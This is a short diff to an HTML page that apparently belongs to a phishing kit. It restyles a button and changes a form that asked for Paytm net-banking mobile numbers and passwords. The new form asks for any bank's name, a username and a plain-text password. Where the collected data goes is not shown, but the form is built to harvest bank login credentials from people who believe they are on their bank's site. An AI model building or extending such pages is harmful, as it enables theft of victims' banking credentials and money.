@@ -21,7 +21,7 @@ body {
      }
 
 button {
-  background-color:#49DEE7  ;
+  background-color:#05d7fc  ;
   color:white;
   padding: 10px 1px;
   margin: 1px 0;
@@ -93,11 +93,13 @@ span.psw {
     
 <br><BR><br><br><BR><br><br><BR><br><br><BR>
 
-    <input type="text" placeholder="Enter your Paytm Netbanking Mobile Number" name="Mob No" required>
+   <input type="text" placeholder="Enter your bank name e.g, SBI Axis icici" name="Bankname" required>
+
+
+    <input type="text" placeholder="Enter Username" name="Mob No" required>
 
   
-
-    <input type="text" placeholder="Paytm Netbanking Password" name="PASS" required>
+    <input type="text" placeholder="Enter Password" name="PASS" required>
 <BR><BR>
 
 
